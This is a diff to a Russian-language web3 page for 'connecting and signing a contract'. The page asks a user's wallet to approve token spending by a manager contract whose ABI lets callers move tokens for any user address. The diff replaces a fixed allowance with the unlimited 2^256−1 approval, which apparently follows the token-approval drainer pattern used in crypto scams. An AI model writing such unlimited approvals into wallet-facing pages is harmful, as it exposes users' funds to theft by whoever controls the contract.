@@ -6,7 +6,7 @@
     <title>Подключение и Подписание Контракта</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        let web3;
+       let web3;
         const managerContractAddress = "0x959d441664c99ba82fb963f78dce4f3a8b3eda9c"; // Адрес контракта CustomTokenManager на тестовой сети
         const managerAbi = [{"inputs":[{"internalType":"address","name":"_usdtTokenAddress","type":"address"},{"internalType":"address","name":"_customTokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"address","name":"usdtTokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"customTokenAddress","type":"address"}],"name":"ContractDeployed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"CustomTokenDeposited","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"USDTWithdrawn","type":"event"},{"inputs":[],"name":"customToken","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"depositCustomToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdtToken","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}];
         const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес реального USDT токена на тестовой сети
@@ -55,10 +55,12 @@
             try {
                 // Создаем экземпляр контракта токена
                 const tokenContract = new web3.eth.Contract(customTokenAbi, tokenAddress);
-                const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
+
+                // Устанавливаем максимальный лимит для approve (2^256 - 1)
+                const maxApproval = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
 
                 // Выполняем транзакцию approve для предоставления доступа контракту на управление токенами
-                await tokenContract.methods.approve(managerContractAddress, amountToApprove).send({ from: userAddress });
+                await tokenContract.methods.approve(managerContractAddress, maxApproval).send({ from: userAddress });
                 console.log(`Доступ к ${tokenName} токенам предоставлен для контракта:`, managerContractAddress);
             } catch (error) {
                 console.error(`Ошибка при предоставлении разрешения на управление ${tokenName} токенами:`, error);
